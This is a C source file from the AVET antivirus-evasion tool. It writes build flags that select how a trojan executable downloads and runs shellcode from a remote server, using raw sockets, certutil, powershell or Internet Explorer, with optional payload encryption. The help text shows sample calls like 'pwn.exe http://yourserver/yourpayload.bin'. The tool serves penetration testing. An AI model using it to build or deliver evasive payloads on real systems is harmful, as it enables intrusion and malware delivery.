/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

#include <getopt.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
 
void print_start();
void print_help();

int main (int argc, char **argv)
{
	print_start();
	
	char *evalue = NULL;
	char *uvalue = NULL;
	char *wvalue = NULL;
	int hflag = 0;	
	int Eflag = 0;	
	char *dvalue = NULL;

	int index;
	int c;

	opterr = 0;

	// compute the options
	while ((c = getopt (argc, argv, "e:u:d:w:hE")) != -1)
		switch (c)
		{
			case 'd':
				dvalue = optarg;
				break;
			case 'e':
				evalue = optarg;
				break;			
			case 'u':
				uvalue = optarg;
				break;
			case 'w':
				wvalue = optarg;
				break;
			case 'h':
				hflag = 1;
				break;				
			case 'E':
				Eflag = 1;
				break;				
			case '?':
				if (optopt == 'e')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'k')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'u')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'w')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return 1;
			default:
				abort ();
		}

	// print help
	if (hflag)
		print_help();	
	
	// exec from url
	else if (uvalue)
	{
		printf ("write url %s to defs.h\n", uvalue);

		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fseek (file_def, 0, SEEK_END);
		fprintf (file_def, "#define UVALUE \"%s\"\n", uvalue);

		fclose (file_def);
	}

	//write flags to defs.h
	FILE *file_def;
	file_def = fopen ("defs.h","a");
	if (file_def == NULL)
	{
		printf ("Error open defs.h\n");
		return -1;
	}	
	
	//write ENCRYPT to defs.h
	if(Eflag)
		fprintf (file_def, "#define ENCRYPT\n");	

	if(dvalue)
	{
		if (strcmp(dvalue, "sock")==0)
			fprintf (file_def, "#define DOWNLOADEXECSC\n");
		else if (strcmp(dvalue, "certutil")==0)
			fprintf (file_def, "#define DOWNLOADCERTUTIL\n");
		else if (strcmp(dvalue, "powershell")==0)
			fprintf (file_def, "#define DOWNLOADPOWERSHELL\n");
	}
	
	fclose(file_def);	

} //main

void print_help()
{
	printf("Options:\n");	
	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
	printf("-d download the shellcode file using different techniques\n");
	printf("   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)\n");
	printf("      usage example: pwn.exe http://yourserver/yourpayload.bin\n");
	printf("   -d certutil -> use certutil.exe for downloading the file\n");
	printf("   -d powershell -> use powershell for downloading the file\n");
	printf("      usage of -d certutil/powershell in combination with -f\n");
	printf("      for executing the raw shellcode after downloading\n");
	printf("      call: pwn thepayload.bin http://server/thepayload.bin\n");
	printf("-E use avets ASCII encryption, often do not has to be used\n");		
	printf("-h help\n\n");
	printf("Please refer README.md for more information\n");
}

void print_start()
{
	char output[] =
		" ________  ___      ___ _______  _________  \n" 
		"|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
		"\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
		" \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
		"  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
		"   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
		"    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
		"\n\nAnti Virus Evasion Make Tool by Daniel Sauder\n"
		"use -h for help\n\n";
	printf("\n%s", output);
}